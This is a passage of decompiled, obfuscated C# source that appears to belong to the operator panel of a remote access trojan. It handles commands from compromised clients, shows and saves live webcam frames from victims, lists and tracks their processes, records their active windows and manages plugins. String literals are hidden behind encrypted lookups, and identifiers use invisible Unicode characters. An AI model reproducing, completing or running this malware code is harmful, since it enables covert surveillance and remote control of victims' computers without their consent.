																ListViewItem listViewItem14 = manager8.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0005().Items.Add(fileInfo3.FullName, fileInfo3.Name, 0);
																listViewItem14.SubItems.Add(string.Empty);
																listViewItem14.SubItems.Add(global::\u0006\u2001.\u0002(-1829129184));
															}
														}
													}
												}
											}
										}
									}
								}
								else if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829129148), false) == 0)
								{
									if (client.osk == null)
									{
										client.isPL = true;
										try
										{
											client.osk = global::\u000E\u2000.\u0005.GetClient(array2[1]);
										}
										catch (Exception ex14)
										{
											client.CN = false;
										}
									}
									Cam cam = (Cam)global::\u000E\u2000.\u0002(global::\u0006\u2001.\u0002(-1829136690) + client.ip());
									string left10 = array2[2];
									if (Operators.CompareString(left10, global::\u0006\u2001.\u0002(-1829139089), false) == 0)
									{
										if (cam == null)
										{
											if (global::\u000E\u2000.\u000F.InvokeRequired)
											{
												global::\u000E\u2000.\u000F.Invoke(new \u000E\u2000.\u0005(global::\u000E\u2000.\u0003), new object[]
												{
													RuntimeHelpers.GetObjectValue(\u0002)
												});
											}
											else
											{
												cam = new Cam();
												cam.sk = client;
												cam.osk = client.osk;
												cam.Name = global::\u0006\u2001.\u0002(-1829136690) + client.ip();
												int num37 = 3;
												int num38 = array2.Length - 1;
												for (int num39 = num37; num39 <= num38; num39++)
												{
													cam.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().SelectedIndex = cam.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Items.Add(array2[num39]);
												}
												cam.Show();
											}
										}
										else
										{
											int num40 = 3;
											int num41 = array2.Length - 1;
											for (int num42 = num40; num42 <= num41; num42++)
											{
												cam.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().SelectedIndex = cam.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Items.Add(array2[num42]);
											}
										}
									}
									else if (Operators.CompareString(left10, global::\u0006\u2001.\u0002(-1829138798), false) == 0)
									{
										if (cam != null)
										{
											Cam cam2 = cam;
											cam2.fps++;
											cam.pkt = array.Length;
											Thread.Sleep(10);
											if (array2[3].Length != 1)
											{
												Image image = Image.FromStream(new MemoryStream((byte[])NewLateBinding.LateIndexGet(global::\u000E.\u0002(array, array2[2] + global::\u000E\u2000.\u000E), new object[]
												{
													1
												}, null)));
												if (cam.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Checked)
												{
													try
													{
														image.Save(cam.folder + DateAndTime.Now.ToString(global::\u0006\u2001.\u0002(-1829128482)) + global::\u0006\u2001.\u0002(-1829128920));
													}
													catch (Exception ex15)
													{
													}
												}
												cam.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Image = image;
											}
										}
									}
									else if (Operators.CompareString(left10, global::\u0006\u2001.\u0002(-1829138768), false) == 0)
									{
										if (cam != null)
										{
											cam.6guxh4d2jsj76dydhs2rmp4ymc3257zb\u200A\u2009\u2000\u2005\u0002().Text = global::\u0006\u2001.\u0002(-1829138894);
										}
									}
								}
								else
								{
									if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829129126), false) == 0)
									{
										Manager manager9 = (Manager)global::\u000E\u2000.\u0002(global::\u0006\u2001.\u0002(-1829137268) + client.ip());
										if (manager9 == null)
										{
											return;
										}
										ToolStripProgressBar obj15 = manager9.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
										lock (obj15)
										{
											string left11 = array2[1];
											if (Operators.CompareString(left11, global::\u0006\u2001.\u0002(-1829129041), false) == 0)
											{
												manager9.PID = Conversions.ToInteger(array2[2]);
												return;
											}
											if (Operators.CompareString(left11, global::\u0006\u2001.\u0002(-1829138798), false) == 0)
											{
												Manager obj16 = manager9;
												lock (obj16)
												{
													string[] array27 = Strings.Split(array2[2], global::\u0006\u2001.\u0002(-1829129051), -1, CompareMethod.Binary);
													bool flag2 = manager9.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Items.Count == 0;
													if (!flag2)
													{
														try
														{
															foreach (object obj17 in manager9.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Items)
															{
																ListViewItem listViewItem15 = (ListViewItem)obj17;
																if (listViewItem15.ForeColor == Color.GreenYellow)
																{
																	try
																	{
																		foreach (object obj18 in listViewItem15.SubItems)
																		{
																			ListViewItem.ListViewSubItem listViewSubItem = (ListViewItem.ListViewSubItem)obj18;
																			listViewSubItem.ForeColor = manager9.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().ForeColor;
																		}
																	}
																	finally
																	{
																		IEnumerator enumerator8;
																		if (enumerator8 is IDisposable)
																		{
																			(enumerator8 as IDisposable).Dispose();
																		}
																	}
																}
															}
														}
														finally
														{
															IEnumerator enumerator7;
															if (enumerator7 is IDisposable)
															{
																(enumerator7 as IDisposable).Dispose();
															}
														}
													}
													if (array27.Length > 1)
													{
														manager9.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Value = 0;
														manager9.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Maximum = array27.Length;
														List<ListViewItem> list9 = new List<ListViewItem>();
														foreach (string text5 in array27)
														{
															string[] array29 = Strings.Split(text5, global::\u0006\u2001.\u0002(-1829129030), -1, CompareMethod.Binary);
															if (Operators.CompareString(text5, string.Empty, false) == 0)
															{
																break;
															}
															if (array29[2].StartsWith(global::\u0006\u2001.\u0002(-1829129040)))
															{
																array29[2] = array29[2].Remove(0, global::\u0006\u2001.\u0002(-1829129040).Length);
															}
															try
															{
																ToolStripProgressBar toolStripProgressBar = manager9.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002();
																toolStripProgressBar.Value++;
															}
															catch (Exception ex16)
															{
															}
															ListViewItem listViewItem16 = new ListViewItem(array29[0]);
															listViewItem16.SubItems.Add(array29[1]);
															listViewItem16.Name = array29[1];
															if (array29[2].Contains(global::\u0006\u2001.\u0002(-1829129083)))
															{
																listViewItem16.SubItems.Add(new FileInfo(array29[2].Replace(global::\u0006\u2001.\u0002(-1829138502), string.Empty)).Directory.Name);
																listViewItem16.ToolTipText = array29[2].Replace(global::\u0006\u2001.\u0002(-1829138502), string.Empty);
															}
															else
															{
																listViewItem16.SubItems.Add(string.Empty);
															}
															string text6 = global::\u0006\u2001.\u0002(-1829139381);
															listViewItem16.SubItems.Add(array29[3]);
															if (array29[4].StartsWith(global::\u0006\u2001.\u0002(-1829138502)))
															{
																text6 = global::\u0006\u2001.\u0002(-1829138502);
																array29[4] = array29[4].Remove(0, 1);
															}
															if (array29[4].Contains(text6))
															{
																array29[4] = array29[4].Remove(0, Strings.InStr(array29[4], text6, CompareMethod.Binary));
																if (array29[4].StartsWith(global::\u0006\u2001.\u0002(-1829139381)))
																{
																	array29[4] = array29[4].Remove(0, 1);
																}
																listViewItem16.SubItems.Add(array29[4]);
															}
															else
															{
																listViewItem16.SubItems.Add(string.Empty);
															}
															if (!flag2)
															{
																listViewItem16.ForeColor = Color.GreenYellow;
															}
															if (Conversions.ToInteger(array29[1]) == manager9.PID)
															{
																listViewItem16.ForeColor = Color.Red;
															}
															list9.Add(listViewItem16);
															if (list9.Count > 10)
															{
																manager9.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Items.AddRange(list9.ToArray());
																list9.Clear();
															}
														}
														if (list9.Count > 0)
														{
															manager9.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Items.AddRange(list9.ToArray());
															list9.Clear();
														}
														if (manager9.PRFX)
														{
															manager9.PRFX = false;
															manager9.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().\u0005();
														}
														ColumnHeader u8 = manager9.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().\u0006;
														if (u8 == null)
														{
															manager9.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().\u0002(manager9.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002(), new ColumnClickEventArgs(0));
														}
														else
														{
															if (Operators.ConditionalCompareObjectEqual(u8.Tag, global::\u0006\u2001.\u0002(-1829128662), false))
															{
																u8.Tag = global::\u0006\u2001.\u0002(-1829128670);
															}
															else if (Operators.ConditionalCompareObjectEqual(u8.Tag, global::\u0006\u2001.\u0002(-1829128670), false))
															{
																u8.Tag = global::\u0006\u2001.\u0002(-1829128662);
															}
															else
															{
																u8.Tag = global::\u0006\u2001.\u0002(-1829128670);
															}
															manager9.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().\u0002(manager9.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002(), new ColumnClickEventArgs(u8.Index));
														}
													}
													manager9.PRNXT = true;
													return;
												}
											}
											if (Operators.CompareString(left11, global::\u0006\u2001.\u0002(-1829128646), false) == 0)
											{
												int num44 = 2;
												int num45 = array2.Length - 1;
												for (int num46 = num44; num46 <= num45; num46++)
												{
													manager9.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Items.RemoveByKey(array2[num46]);
												}
												return;
											}
											if (Operators.CompareString(left11, global::\u0006\u2001.\u0002(-1829131567), false) == 0)
											{
												manager9.bka84w52fvbnc3hv3zrvgaaezew9bydu\u200A\u2009\u2000\u2005\u0002().Text = array2[2];
											}
											return;
										}
									}
									if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829129060), false) != 0)
									{
										if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829129069), false) != 0)
										{
											if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829129003), false) == 0)
											{
												if (client.L == null)
												{
													return;
												}
												if (client.L.Cells.Count <= global::\u000E\u2000.\u0008\u2001)
												{
													return;
												}
												Collection online = global::\u000E\u2000.\u000F.S.Online;
												lock (online)
												{
													DataGridViewCell dataGridViewCell = client.L.Cells[global::\u000E\u2000.\u0008\u2001];
													int num47 = Conversions.ToInteger(array2[1]);
													if (num47 == 999)
													{
														dataGridViewCell.Style.ForeColor = Color.Orange;
													}
													else if (num47 >= 500)
													{
														dataGridViewCell.Style.ForeColor = Color.GreenYellow;
													}
													else if (num47 >= 250)
													{
														dataGridViewCell.Style.ForeColor = Color.LightGreen;
													}
													else
													{
														dataGridViewCell.Style.ForeColor = Color.LimeGreen;
													}
													client.L.Cells[global::\u000E\u2000.\u0008\u2001].Value = array2[1] + global::\u0006\u2001.\u0002(-1829123283);
													return;
												}
											}
											if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829123292), false) == 0)
											{
												client.L.DefaultCellStyle.ForeColor = global::\u000E\u2000.\u000F.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().DefaultCellStyle.ForeColor;
												return;
											}
											if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829139089), false) == 0)
											{
												client.Send(global::\u0006\u2001.\u0002(-1829139089));
												return;
											}
											if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829123270), false) == 0)
											{
												if (global::\u000E\u2000.\u0002.\u000E)
												{
													global::\u000E\u2000.\u000F.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().\u0002(new object[]
													{
														Color.LightSteelBlue,
														global::\u000E.\u0002(),
														Color.DarkSlateBlue,
														client.COI,
														client.ip(),
														Color.SteelBlue,
														RuntimeHelpers.GetObjectValue(global::\u000E\u2000.\u0002(client.L)),
														global::\u0006\u2001.\u0002(-1829139159),
														Color.Purple,
														global::\u0006\u2001.\u0002(-1829123280),
														Color.White,
														array2[1]
													});
													return;
												}
												goto IL_465F;
											}
											else if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829131567), false) == 0)
											{
												if (global::\u000E\u2000.\u0002.\u0006)
												{
													global::\u000E\u2000.\u000F.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().\u0002(new object[]
													{
														Color.LightSteelBlue,
														global::\u000E.\u0002(),
														Color.DarkSlateBlue,
														client.COI,
														client.ip(),
														Color.SteelBlue,
														RuntimeHelpers.GetObjectValue(global::\u000E\u2000.\u0002(client.L)),
														global::\u0006\u2001.\u0002(-1829139159),
														Color.Purple,
														global::\u0006\u2001.\u0002(-1829123280),
														Color.White,
														array2[1] + global::\u0006\u2001.\u0002(-1829139381) + array2[2]
													});
													return;
												}
												goto IL_465F;
											}
											else if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829123322), false) == 0)
											{
												try
												{
													client.plg.Remove(array2[1]);
												}
												catch (Exception ex17)
												{
												}
												if (Operators.CompareString(array2[2].ToString(), global::\u0006\u2001.\u0002(-1829123299), false) == 0)
												{
													client.plg.Add(array2[1]);
													return;
												}
												global::\u000E\u2000.\u0002(client, global::\u000E\u2000.\u0002(null, array2[1]), Conversions.ToBoolean(array2[2]));
												return;
											}
											else
											{
												if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829136402), false) == 0)
												{
													try
													{
														client.lastPC = DateAndTime.Now;
														client.Isend = false;
														byte[] array30 = (byte[])NewLateBinding.LateIndexGet(global::\u000E.\u0002(array, global::\u000E\u2000.\u000E), new object[]
														{
															1
														}, null);
														if (array30.Length < 10)
														{
															return;
														}
														client.L.Cells[0].Value = Image.FromStream(new MemoryStream(array30));
														return;
													}
													catch (Exception ex18)
													{
														return;
													}
												}
												if (Operators.CompareString(left, global::\u0006\u2001.\u0002(-1829123307), false) == 0 && client.L != null && Operators.CompareString(client.lastAC, array2[1], false) != 0)
												{
													client.lastAC = array2[1];
													Collection online2 = global::\u000E\u2000.\u000F.S.Online;
													lock (online2)
													{
														client.L.Cells[global::\u000E\u2000.\u0006\u2001].Value = global::\u000E.\u0003(array2[1]);
													}
													goto IL_465F;
												}
												goto IL_465F;
											}
										}
									}
									try
									{
										if (client.L != null)
										{
											global::\u000E\u2000.\u000F.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().\u0002(client.L);
										}
										List<object> list10 = new List<object>();
										list10.Add(global::\u0002\u2001.\u0006());
										list10.Add(global::\u000E.\u0003(array2[1]));
										list10.Add(Strings.Split(client.ip(), global::\u0006\u2001.\u0002(-1829128982), -1, CompareMethod.Binary)[0]);
										int num48 = 2;
										int num49 = array2.Length - 2;
										for (int num50 = num48; num50 <= num49; num50++)
										{
											int num51 = num50 + 1;
											if (num51 == global::\u000E\u2000.\u0006\u2001 - 1)
											{
												client.lastAC = array2[num50];
												list10.Add(global::\u000E.\u0003(array2[num50]));
											}
											else if (num51 == global::\u000E\u2000.\u000E\u2000)
											{
												string co = client.Co;
												list10.Add(client.COI);
												list10.Add(client.CName);
											}
											else
											{
												list10.Add(array2[num50]);
											}
										}
										client.Folder = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(list10[global::\u000E\u2000.\u0005\u2000], global::\u0006\u2001.\u0002(-1829136997)), list10[global::\u000E\u2000.\u0008\u2000]), global::\u0006\u2001.\u0002(-1829136997)), Strings.Split(Conversions.ToString(list10[global::\u000E\u2000.\u0002\u2000]), global::\u0006\u2001.\u0002(-1829136997), -1, CompareMethod.Binary)[Strings.Split(Conversions.ToString(list10[global::\u000E\u2000.\u0002\u2000]), global::\u0006\u2001.\u0002(-1829136997), -1, CompareMethod.Binary).Length - 1]));
										string text7 = global::\u0006\u2001.\u0002(-1829128990);
										int num52 = 0;
										int length = text7.Length;
										while (num52 < length)
										{
											string text8 = Conversions.ToString(text7[num52]);
											client.Folder = client.Folder.Replace(text8, global::\u0006\u2001.\u0002(-1829140324) + Conversion.Hex(Strings.Asc(text8)));
											num52++;
										}
										client.Folder = Application.StartupPath + global::\u0006\u2001.\u0002(-1829128974) + client.Folder + global::\u0006\u2001.\u0002(-1829139395);
										client.L = global::\u000E\u2000.\u000F.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().\u0002(client.ip(), list10.ToArray());
										client.L.Tag = client;
										list10.Clear();
										client.plg.AddRange(Strings.Split(array2[array2.Length - 1], global::\u0006\u2001.\u0002(-1829136748), -1, CompareMethod.Binary));
									}
									catch (Exception ex19)
									{
									}
									if (global::\u000E\u2000.\u0002.\u0003)
									{
										global::\u000E\u2000.\u000F.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().\u0002(new object[]
										{
											Color.LightSteelBlue,
											global::\u000E.\u0002(),
											Color.DarkSlateBlue,
											client.COI,
											client.ip(),
											Color.SteelBlue,
											RuntimeHelpers.GetObjectValue(global::\u000E\u2000.\u0002(client.L)),
											Color.DarkBlue,
											global::\u0006\u2001.\u0002(-1829129023)
										});
									}
									if (global::\u000E\u2000.\u0002.\u0002)
									{
										global::\u000E\u2000.\u0002\u2002.AddItem(client.COI, string.Format(global::\u0002\u2001.\u0002(), new object[]
										{
											RuntimeHelpers.GetObjectValue(client.L.Cells[global::\u000E\u2000.\u0005\u2000].Value),
											RuntimeHelpers.GetObjectValue(client.L.Cells[global::\u000E\u2000.\u0008\u2000].Value),
											RuntimeHelpers.GetObjectValue(client.L.Cells[global::\u000E\u2000.\u0002\u2001].Value),
											RuntimeHelpers.GetObjectValue(client.L.Cells[global::\u000E\u2000.\u000F\u2000].Value),
											RuntimeHelpers.GetObjectValue(client.L.Cells[global::\u000E\u2000.\u0005\u2001].Value),
											RuntimeHelpers.GetObjectValue(client.L.Cells[global::\u000E\u2000.\u0002\u2000].Value),
											client.ip().Split(new char[]
											{
												':'
											})[0]
										}));
									}
								}
							}
						}
					}
				}
				IL_465F:;
			}
			catch (Exception ex20)
			{
				if (Operators.CompareString(array2[0], global::\u0006\u2001.\u0002(-1829137025), false) == 0 | Operators.CompareString(array2[0], global::\u0006\u2001.\u0002(-1829123221), false) == 0)
				{
					try
					{
						client.Send(global::\u0006\u2001.\u0002(-1829123230) + global::\u000E\u2000.\u000E + array2[1]);
					}
					catch (Exception ex21)
					{
					}
				}
				else
				{
					if (Operators.CompareString(array2[0].ToLower(), global::\u0006\u2001.\u0002(-1829123210), false) == 0)
					{
						client.Isend = false;
					}
					if (global::\u000E\u2000.\u0002.\u0008)
					{
						global::\u000E\u2000.\u000F.4ze8txrha7455v6nqsxv2kth6y2annws\u200A\u2009\u2000\u2005\u0002().\u0002(new object[]
						{
							Color.LightSteelBlue,
							global::\u000E.\u0002(),
							Color.BlueViolet,
							global::\u0006\u2001.\u0002(-1829123252),
							Color.DarkRed,
							global::\u0006\u2001.\u0002(-1829123234),
							Color.White,
							array2[0],
							Color.Red,
							ex20.Message
						});
					}
				}
			}
		}
	}

	// Token: 0x04000053 RID: 83
	public static \u000E\u2000.\u0002 \u0002 = new \u000E\u2000.\u0002();

	// Token: 0x04000054 RID: 84
	public static string \u0003 = global::\u0006\u2001.\u0002(-1829128358);

	// Token: 0x04000055 RID: 85
	public static SK \u0005;

	// Token: 0x04000056 RID: 86
	public static long \u0008 = 0L;

	// Token: 0x04000057 RID: 87
	public static long \u0006 = 0L;

	// Token: 0x04000058 RID: 88
	public static string \u000E = global::\u0006\u2001.\u0002(-1829128280);

	// Token: 0x04000059 RID: 89
	public static Form1 \u000F;

	// Token: 0x0400005A RID: 90
	public static int \u0002\u2000 = 1;

	// Token: 0x0400005B RID: 91
	public static int \u0003\u2000 = 2;

	// Token: 0x0400005C RID: 92
	public static int \u0005\u2000 = 3;

	// Token: 0x0400005D RID: 93
	public static int \u0008\u2000 = 4;

	// Token: 0x0400005E RID: 94
	public static int \u0006\u2000 = 5;

	// Token: 0x0400005F RID: 95
	public static int \u000E\u2000 = 6;

	// Token: 0x04000060 RID: 96
	public static int \u000F\u2000 = 7;

	// Token: 0x04000061 RID: 97
	public static int \u0002\u2001 = 8;

	// Token: 0x04000062 RID: 98
	public static int \u0003\u2001 = 9;

	// Token: 0x04000063 RID: 99
	public static int \u0005\u2001 = 10;

	// Token: 0x04000064 RID: 100
	public static int \u0008\u2001 = 11;

	// Token: 0x04000065 RID: 101
	public static int \u0006\u2001 = 12;

	// Token: 0x04000066 RID: 102
	public static List<string> \u000E\u2001 = new List<string>();

	// Token: 0x04000067 RID: 103
	public static List<\u000E\u2000.\u0003> \u000F\u2001 = new List<\u000E\u2000.\u0003>();

	// Token: 0x04000068 RID: 104
	public static notf \u0002\u2002 = new notf();

	// Token: 0x04000069 RID: 105
	private static List<Client> \u0003\u2002 = new List<Client>();

	// Token: 0x0400006A RID: 106
	public static \u000F \u0005\u2002 = new \u000F(Application.StartupPath + global::\u0006\u2001.\u0002(-1829128260), 1);

	// Token: 0x0400006B RID: 107
	public static WaveOut \u0008\u2002;

	// Token: 0x0400006C RID: 108
	public static WaveOut \u0006\u2002;

	// Token: 0x0400006D RID: 109
	public static bool \u000E\u2002 = true;

	// Token: 0x02000011 RID: 17
	public sealed class \u0002
	{
		// Token: 0x06000070 RID: 112 RVA: 0x0000C010 File Offset: 0x0000A210
		public void \u0002()
		{
			this.\u0002 = Conversions.ToBoolean(global::\u000E.\u0002(global::\u0006\u2001.\u0002(-1829130104), global::\u0006\u2001.\u0002(-1829130088)));
			this.\u0003 = Conversions.ToBoolean(global::\u000E.\u0002(global::\u0006\u2001.\u0002(-1829130003), global::\u0006\u2001.\u0002(-1829130088)));
			this.\u0005 = Conversions.ToBoolean(global::\u000E.\u0002(global::\u0006\u2001.\u0002(-1829129986), global::\u0006\u2001.\u0002(-1829130039)));
			this.\u0008 = Conversions.ToBoolean(global::\u000E.\u0002(global::\u0006\u2001.\u0002(-1829130019), global::\u0006\u2001.\u0002(-1829130088)));
			this.\u0006 = Conversions.ToBoolean(global::\u000E.\u0002(global::\u0006\u2001.\u0002(-1829128401), global::\u0006\u2001.\u0002(-1829130088)));
			this.\u000E = Conversions.ToBoolean(global::\u000E.\u0002(global::\u0006\u2001.\u0002(-1829128415), global::\u0006\u2001.\u0002(-1829130088)));
			this.\u000F = Conversions.ToBoolean(global::\u000E.\u0002(global::\u0006\u2001.\u0002(-1829128397), global::\u0006\u2001.\u0002(-1829130088)));
			this.\u0002\u2000 = global::\u000E.\u0002(global::\u0006\u2001.\u0002(-1829128441), global::\u0006\u2001.\u0002(-1829128419));
			this.\u0003\u2000 = Conversions.ToBoolean(global::\u000E.\u0002(global::\u0006\u2001.\u0002(-1829128427), global::\u0006\u2001.\u0002(-1829130088)));
			this.\u0005\u2000 = Conversions.ToInteger(global::\u000E.\u0002(global::\u0006\u2001.\u0002(-1829128344), global::\u0006\u2001.\u0002(-1829128419)));
			this.\u0008\u2000 = Conversions.ToBoolean(global::\u000E.\u0002(global::\u0006\u2001.\u0002(-1829128323), global::\u0006\u2001.\u0002(-1829130088)));
			this.\u0006\u2000 = Conversions.ToInteger(global::\u000E.\u0002(global::\u0006\u2001.\u0002(-1829128336), global::\u0006\u2001.\u0002(-1829139276)));
			this.\u000E\u2000 = Conversions.ToInteger(global::\u000E.\u0002(global::\u0006\u2001.\u0002(-1829128379), global::\u0006\u2001.\u0002(-1829139276)));
		}

		// Token: 0x06000071 RID: 113 RVA: 0x0000C1EC File Offset: 0x0000A3EC
		public void \u0003()
		{
			global::\u000E.\u0002(global::\u0006\u2001.\u0002(-1829130104), this.\u0002.ToString());
			global::\u000E.\u0002(global::\u0006\u2001.\u0002(-1829130003), this.\u0003.ToString());
			global::\u000E.\u0002(global::\u0006\u2001.\u0002(-1829129986), this.\u0005.ToString());
			global::\u000E.\u0002(global::\u0006\u2001.\u0002(-1829130019), this.\u0008.ToString());
			global::\u000E.\u0002(global::\u0006\u2001.\u0002(-1829128401), this.\u0006.ToString());
			global::\u000E.\u0002(global::\u0006\u2001.\u0002(-1829128415), this.\u000E.ToString());
			global::\u000E.\u0002(global::\u0006\u2001.\u0002(-1829128397), this.\u000F.ToString());
			global::\u000E.\u0002(global::\u0006\u2001.\u0002(-1829128441), this.\u0002\u2000.ToString());
			global::\u000E.\u0002(global::\u0006\u2001.\u0002(-1829128427), this.\u0003\u2000.ToString());
			global::\u000E.\u0002(global::\u0006\u2001.\u0002(-1829128344), this.\u0005\u2000.ToString());
			global::\u000E.\u0002(global::\u0006\u2001.\u0002(-1829128323), this.\u0008\u2000.ToString());
			global::\u000E.\u0002(global::\u0006\u2001.\u0002(-1829128336), this.\u0006\u2000.ToString());
			global::\u000E.\u0002(global::\u0006\u2001.\u0002(-1829128379), this.\u000E\u2000.ToString());
		}

		// Token: 0x04000075 RID: 117
		public bool \u0002;

		// Token: 0x04000076 RID: 118
		public bool \u0003;

		// Token: 0x04000077 RID: 119
		public bool \u0005;

		// Token: 0x04000078 RID: 120
		public bool \u0008;

		// Token: 0x04000079 RID: 121
		public bool \u0006;

		// Token: 0x0400007A RID: 122
		public bool \u000E;

		// Token: 0x0400007B RID: 123
		public bool \u000F;

		// Token: 0x0400007C RID: 124
		public string \u0002\u2000;

		// Token: 0x0400007D RID: 125
		public bool \u0003\u2000;

		// Token: 0x0400007E RID: 126
		public int \u0005\u2000;

		// Token: 0x0400007F RID: 127
		public bool \u0008\u2000;

		// Token: 0x04000080 RID: 128
		public int \u0006\u2000;

		// Token: 0x04000081 RID: 129
		public int \u000E\u2000;
	}

	// Token: 0x02000012 RID: 18
	public sealed class \u0003
	{
		// Token: 0x06000072 RID: 114 RVA: 0x0000C34C File Offset: 0x0000A54C
		public \u0003(string \u0002)
		{
			byte[] u = File.ReadAllBytes(Application.StartupPath + global::\u0006\u2001.\u0002(-1829136829) + \u0002);
			bool flag = true;
			this.\u0002 = global::\u000E.\u0002(u, ref flag);
			this.\u0003 = \u0002;
			this.\u0005 = global::\u000E.\u0002(this.\u0002);
		}

		// Token: 0x04000082 RID: 130
		public byte[] \u0002;

		// Token: 0x04000083 RID: 131
		public string \u0003;

		// Token: 0x04000084 RID: 132
		public string \u0005;
	}

	// Token: 0x02000013 RID: 19
	// (Invoke) Token: 0x06000076 RID: 118
	public delegate void \u0005(object \u0002);
}
